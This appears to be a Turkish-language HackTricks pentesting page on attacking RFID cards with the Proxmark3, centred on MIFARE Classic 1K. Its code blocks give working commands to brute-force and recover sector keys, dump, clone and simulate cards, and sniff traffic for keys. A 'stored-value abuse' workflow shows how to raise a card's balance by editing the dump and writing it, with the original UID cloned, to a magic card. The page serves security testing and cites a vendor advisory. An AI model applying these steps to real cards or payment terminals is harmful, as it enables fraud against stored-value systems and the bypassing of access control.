# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3 ile RFID Sistemlerine Saldırma

Aktif olarak sürdürülen RRG/Iceman Proxmark3 istemcisini ve eşleşen firmware’i yükleyin, ardından aşağıda gösterilen eski komutlar değişmiş olabileceğinden komut sözdizimini bu derlemeyle doğrulayın.<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KB’ye Saldırma

MIFARE Classic 1K, **16 sektör** içerir ve her sektörde **16 baytlık 4 blok** bulunur. Üretici bloğu 0, UID/üretici verilerini içerir ve orijinal NXP kartlarda salt okunurdur; özel clone veya “magic” kartlar bu bloğun yeniden yazılmasına izin verebilir.<sup>[[1]](#references)[[2]](#references)</sup>\
Her sektöre erişmek için, her sektörün **3. bloğunda** (sektör trailer’ı) saklanan **2 anahtara** (**A** ve **B**) ihtiyacınız vardır. Sektör trailer’ı ayrıca, 2 anahtarı kullanarak **her blok** için **okuma ve yazma** izinlerini belirleyen **erişim bitlerini** de saklar.\
Örneğin, ilkini biliyorsanız okuma, ikincisini biliyorsanız yazma izni vermek için 2 anahtar kullanışlıdır.

Birkaç saldırı gerçekleştirilebilir

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3, hassas verileri bulmaya çalışmak için **Tag to Reader communication**'ı **dinleme** gibi başka işlemleri gerçekleştirmeyi sağlar. Bu kartta, iletişimi sniff edip kullanılan key'i hesaplayabilirsiniz; çünkü kullanılan **cryptographic operations zayıftır** ve düz metin ile şifreli metin bilindiğinde key hesaplanabilir (`mfkey64` aracı).<sup>[[3]](#references)</sup>

#### Stored-value abuse için MiFare Classic hızlı iş akışı

Terminaller bakiyeleri Classic kartlarda sakladığında, tipik uçtan uca iş akışı şöyledir:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Notlar

- `hf mf autopwn`, nested/darkside/HardNested tarzı saldırıları yürütür, anahtarları kurtarır ve client dumps klasöründe dump'lar oluşturur.<sup>[[1]](#references)</sup>
- Block 0/UID yazma işlemi yalnızca magic gen1a/gen2 kartlarda çalışır. Normal Classic kartların UID'si salt okunurdur.<sup>[[2]](#references)</sup>
- Birçok kurulumda Classic "value blocks" veya basit checksum'lar kullanılır. Düzenleme sonrasında tüm yinelenen/tamamlayıcı alanların ve checksum'ların tutarlı olduğundan emin olun.<sup>[[4]](#references)</sup>

Daha üst düzey bir metodoloji ve azaltma önlemleri için:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Komutlar

IoT sistemleri bazen **markasız veya ticari olmayan etiketler** kullanır. Bu durumda, etiketlere özel **raw commands** göndermek için Proxmark3 kullanabilirsiniz.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Bu bilgilerle kart ve onunla nasıl iletişim kurulacağı hakkında bilgi aramayı deneyebilirsiniz. Proxmark3 şu tür ham komutlar göndermenizi sağlar: `hf 14a raw -p -b 7 26`

### Scriptler

Proxmark3 yazılımı, basit görevleri gerçekleştirmek için kullanabileceğiniz önceden yüklenmiş **otomasyon scriptleri** listesiyle birlikte gelir. Tam listeyi almak için `script list` komutunu kullanın. Ardından `script run` komutunu ve script’in adını kullanın:

```
proxmark3> script run mfkeys
```

Bir **tag reader**'ı **fuzz testine** tabi tutmak için bir script oluşturabilirsiniz. **Geçerli bir kartın** verilerini kopyaladıktan sonra, bir veya daha fazla rastgele **byte**'ı rastgeleleştiren bir **Lua script**'i yazın ve her yinelemede **reader**'ın çöküp çökmediğini kontrol edin.

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic kartları](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP'nin MIFARE Classic Crypto1 hakkındaki açıklaması](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value'daki NFC kartı güvenlik açığının istismarı (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux kurulumu](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
